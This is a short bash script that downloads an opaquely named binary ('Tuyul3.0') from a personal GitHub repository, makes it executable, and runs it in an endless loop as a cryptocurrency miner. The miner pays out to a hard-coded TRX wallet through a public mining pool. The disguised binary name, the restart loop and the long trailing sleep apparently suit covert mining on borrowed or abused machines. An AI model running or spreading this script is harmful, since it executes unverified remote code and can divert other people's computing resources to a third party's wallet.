#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TGqQjwcpN2NHYVHtCc3ZG6FgdEdCr9puJK
WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#8rgx-in2z)
wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
